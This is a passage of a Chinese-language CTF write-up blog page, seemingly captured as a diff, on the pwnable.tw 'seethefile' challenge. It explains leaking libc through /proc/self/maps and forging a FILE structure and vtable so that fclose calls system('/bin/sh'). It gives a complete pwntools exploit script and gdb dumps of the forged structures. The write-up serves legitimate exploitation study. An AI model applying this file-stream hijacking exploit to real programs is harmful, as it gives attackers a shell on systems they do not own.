  ? ;</span><br><span class="line">.bss:0804B26A                 db    ? ;</span><br><span class="line">.bss:0804B26B                 db    ? ;</span><br><span class="line">.bss:0804B26C                 db    ? ;</span><br><span class="line">.bss:0804B26D                 db    ? ;</span><br><span class="line">.bss:0804B26E                 db    ? ;</span><br><span class="line">.bss:0804B26F                 db    ? ;</span><br><span class="line">.bss:0804B270                 db    ? ;</span><br><span class="line">.bss:0804B271                 db    ? ;</span><br><span class="line">.bss:0804B272                 db    ? ;</span><br><span class="line">.bss:0804B273                 db    ? ;</span><br><span class="line">.bss:0804B274                 db    ? ;</span><br><span class="line">.bss:0804B275                 db    ? ;</span><br><span class="line">.bss:0804B276                 db    ? ;</span><br><span class="line">.bss:0804B277                 db    ? ;</span><br><span class="line">.bss:0804B278                 db    ? ;</span><br><span class="line">.bss:0804B279                 db    ? ;</span><br><span class="line">.bss:0804B27A                 db    ? ;</span><br><span class="line">.bss:0804B27B                 db    ? ;</span><br><span class="line">.bss:0804B27C                 db    ? ;</span><br><span class="line">.bss:0804B27D                 db    ? ;</span><br><span class="line">.bss:0804B27E                 db    ? ;</span><br><span class="line">.bss:0804B27F                 db    ? ;</span><br><span class="line">.bss:0804B280                 public fp</span><br><span class="line">.bss:0804B280 ; FILE *fp</span><br><span class="line">.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r</span><br><span class="line">.bss:0804B280                                         ; openfile+AD↑w ...</span><br><span class="line">.bss:0804B280 _bss            ends</span><br><span class="line">.bss:0804B280</span><br></pre></td></tr></table></figure>
+<p>同时程序的功能是可以读取文件内容，我们可以通过读取<code>/proc/self/maps</code>来获得<code>libc</code>的地址。</p>
+<p>我们所需要做的就是伪造一个文件结构，然后将地址赋予给<code>fp</code>：</p>
+<ol>
+<li>找到一个<code>buf1</code>，使得<code>buf1+0x94</code>为<code>_IO_file_jumps</code>结构，同时要注意<code>_vtable_offset</code>要为<code>0</code>，其偏移为<code>0x46</code>且只占一个字节</li>
+<li>找到一个<code>buf2</code>，使得<code>buf2+0x44</code>为<code>fclose</code>的地址</li>
+<li>最后，写入<code>name</code>覆盖<code>fp</code>到<code>buf</code></li>
+</ol>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>打通了之后发现无法<code>cat flag</code>，在<code>/home/seethefile/</code>下可以看到一个<code>get_flag.c</code>的源文件：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_input</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret ;</span><br><span class="line">    ret = read(<span class="number">0</span>,buf,size);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(buf[ret<span class="number">-1</span>] == <span class="string">'\n'</span>)</span><br><span class="line">        buf[ret-1] = '\x00';</span><br><span class="line">    <span class="keyword">return</span> ret ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Your magic :"</span>);</span><br><span class="line">    read_input(buf,<span class="number">40</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(buf,<span class="string">"Give me the flag"</span>))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"GG !"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"/home/seethefile/flag"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Open failed !"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fread(buf,<span class="number">1</span>,<span class="number">40</span>,fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Here is your flag: %s \n"</span>,buf);</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>完整的Exploit：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./seethefile'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10200</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc_32.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./seethefile'</span>)</span><br><span class="line">offset = <span class="number">0x280</span> - <span class="number">0x0C0</span></span><br><span class="line"><span class="comment"># gdb.attach(p, 'b *_IO_new_fclose')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">	p.sendline(str(c))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">openfile</span><span class="params">(filename)</span>:</span></span><br><span class="line">	cmd(<span class="number">1</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'see :'</span>)</span><br><span class="line">	p.sendline(filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writefile</span><span class="params">()</span>:</span></span><br><span class="line">	cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">closefile</span><span class="params">()</span>:</span></span><br><span class="line">	cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">(name)</span>:</span></span><br><span class="line">	cmd(<span class="number">5</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'name :'</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line"></span><br><span class="line">openfile(<span class="string">'/proc/self/maps'</span>)</span><br><span class="line">readfile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">data = p.recvuntil(<span class="string">'r-xp'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">  libc_base = int(data.split(<span class="string">'-'</span>)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  libc_base = int(data.split(<span class="string">'-'</span>)[<span class="number">-3</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x0804B260</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">payload = <span class="string">'/bin/sh'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p32(buf + <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x94</span>, <span class="string">'\x00'</span>)</span><br><span class="line">payload += p32(<span class="number">0x804b2f8</span> - <span class="number">0x44</span>)</span><br><span class="line">payload += p32(system)</span><br><span class="line">exit(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"./home/seethefile/get_flag"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"magic :"</span>)</span><br><span class="line">p.sendline(<span class="string">"Give me the flag\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>修改后的<code>_IO_FILE</code>结构体：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; p *((struct _IO_FILE_plus *)0x804B260)</span><br><span class="line">$30 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0x6e69622f, </span><br><span class="line">    _IO_read_ptr = 0x68732f &lt;error: Cannot access memory at address 0x68732f&gt;, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0xf75f9700 &quot;&quot;, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x804b260 &lt;name&gt; &quot;/bin/sh&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0x0, </span><br><span class="line">    _flags2 = 0x0, </span><br><span class="line">    _old_offset = 0x0, </span><br><span class="line">    _cur_column = 0x0, </span><br><span class="line">    _vtable_offset = 0x0, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x804b270 &lt;name+16&gt;, </span><br><span class="line">    _offset = 0x0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0x0, </span><br><span class="line">    _mode = 0x0, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 39 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x804b2b4</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修改后的<code>vtable</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">assassinq&gt;&gt; p *((struct _IO_jump_t *)0x804B2B4)</span><br><span class="line">$31 = &#123;</span><br><span class="line">  __dummy = 0x0, </span><br><span class="line">  __dummy2 = 0x0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x0, </span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x804b2b4, </span><br><span class="line">  __close = 0xf7634da0 &lt;__libc_system&gt;, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://yuuoniy.github.io/2018/08/14/seethefile-writeup/" target="_blank" rel="noopener">https://yuuoniy.github.io/2018/08/14/seethefile-writeup/</a><br><a href="http://blog.eonew.cn/archives/1123" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1123</a><br><a href="http://blog.leanote.com/post/mut3p1g/FSP-pwnable.tw%5B9%5D" target="_blank" rel="noopener">http://blog.leanote.com/post/mut3p1g/FSP-pwnable.tw%5B9%5D</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/08/12/初探跨站脚本攻击（Cross-Site-Scripting）/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">初探跨站脚本攻击（Cross-Site Scripting）</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Intro"><span class="nav-number">1.</span> <span class="nav-text">Intro</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Analysis"><span class="nav-number">2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#References"><span class="nav-number">4.</span> <span class="nav-text">References</span></a></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 AssassinQ All Rights Reserved.
+        
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+      var headerblur = document.getElementById("header-blur");
+      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
